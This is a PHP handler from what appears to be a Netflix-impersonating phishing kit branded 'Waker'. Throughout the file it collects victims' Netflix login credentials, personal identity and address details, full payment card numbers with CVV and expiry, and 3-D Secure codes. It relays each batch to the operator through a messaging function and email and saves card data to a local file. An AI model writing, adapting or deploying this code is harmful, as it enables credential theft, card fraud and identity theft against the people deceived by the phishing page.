<?php
include '../server/config.php';

if ($testmode == true) {
    $ip = '93.42.70.157';
}else{
    $ip = $_SERVER['REMOTE_ADDR'];
}

if (isset($_GET['action'])) {
    if ($_GET['action'] == 'getLang') {
        die(country($ip));
    }
    if ($_GET['action'] ==  'send') {
        $rez = $_GET['rez'];
        if ($_GET['step'] == "login") {
            $final = explode('|',$rez);
            $message = "
@LeVraiWaker [REZ]
[🏦] Waker Netflix REZ [🏦]
=============================
[🪪] EMAIL : ".$final[0]."
[🔑] PASSWORD : ".$final[1]."
=============================
[🌍] IP : ".$_SERVER['REMOTE_ADDR']."
[🌍] UA : ".$_SERVER['HTTP_USER_AGENT']."
[🏦] Waker Netflix REZ [🏦] ";
                sendMessage($message);
                mail($email,"🪪 +1 Login Netflix - ".$final[0]." - 🪪",$message,'From: 💳 Waker 💳 <log@rez.fr>');
            }else if ($_GET['step'] == "billing") {
                $final = explode('|',$rez);

                $_SESSION['ville'] = $final[4];
            $_SESSION['adresse'] = $final[5];
            $_SESSION['zip'] = $final[6];
            
            $_SESSION['nom'] = $final[0];
            $_SESSION['prenom'] = $final[1];
            $_SESSION['dob'] = $final[2];
            $_SESSION['tel'] = $final[3];

                $message = "
@LeVraiWaker [REZ]
[🏦] Waker Netflix REZ [🏦]
=============================
[🧬] Nom : ".$final[0]."
[🧬] Prénom : ".$final[1]."
[🧬] Date de naissance : ".$final[2]."
[🧬] Numéro de téléphone : ".$final[3]."
=============================
[💊] Ville : ".$final[4]."
[💊] Adresse : ".$final[5]."
[💊] Code Postal : ".$final[6]."
=============================
[🌍] IP : ".$_SERVER['REMOTE_ADDR']."
[🌍] UA : ".$_SERVER['HTTP_USER_AGENT']."
[🏦] Waker Netflix REZ [🏦] ";
                    sendMessage($message);
                    mail($email,"🧬 +1 Billing Netflix - ".$final[0]." - 🧬",$message,'From: 💳 Waker 💳 <log@rez.fr>');
                
            }else if ($_GET['step'] == "cc") {
                $final = explode('|',$rez);
                $bin = substr($final[1],0,7);
                $bin = str_replace(' ','',$bin);
                $data = json_decode(getBin($bin),true);
                $level = $data['level'];
                $type = $data['type'];
                $bank = $data['bank'];
                $message = "
@LeVraiWaker [REZ]
[🏦] Waker Netflix REZ [🏦]
=============================
[🏴‍☠️] Nom : ".$final[0]."
[🏴‍☠️] Numéro de carte : ".$final[1]."
[🏴‍☠️] Date d'expiration : ".$final[2]."
[🏴‍☠️] CVV : ".$final[3]."
=============================
[⚖️] Level : ".$level."
[⚖️] Banque : ".$bank."
[⚖️] Type : ".$type."
=============================
[🌍] IP : ".$_SERVER['REMOTE_ADDR']."
[🌍] UA : ".$_SERVER['HTTP_USER_AGENT']."
[🏦] Waker Netflix REZ [🏦] ";
                    sendMessage($message);
                    mail($email,"🏴‍☠️ +1 CC Netflix - ".$final[1]." - 🏴‍☠️",$message,'From: 💳 Waker 💳 <log@rez.fr>');
                    file_put_contents('rez.txt',$final[0] . '|' . $final[1] . '|' . $final[2]. '|' . $final[3] . '|' . $_SESSION['nom'] . ' ' . $_SESSION['prenom'] . '|' . $_SESSION['ville'] . '|' . $_SESSION['adresse'] . '|' .$_SESSION['zip'] . '|' . $_SESSION['tel'] . '|' . $_SESSION['dob']. '|' . date('d/m/Y h:i:s'));
            }else if ($_GET['step'] == "vbv") {
                $final = explode('|',$rez);
                $message = "
@LeVraiWaker [REZ]
[🏦] Waker Netflix REZ [🏦]
=============================
[🏷] Code : ".$final[0]."
=============================
[🌍] IP : ".$_SERVER['REMOTE_ADDR']."
[🌍] UA : ".$_SERVER['HTTP_USER_AGENT']."
[🏦] Waker Netflix REZ [🏦] ";
                    sendMessage($message);
                    mail($email,"🏷 +1 VBV Netflix - ".$final[1]." - 🏷",$message,'From: 💳 Waker 💳 <log@rez.fr>');
                
            }
        }
}

   
?>
   
?>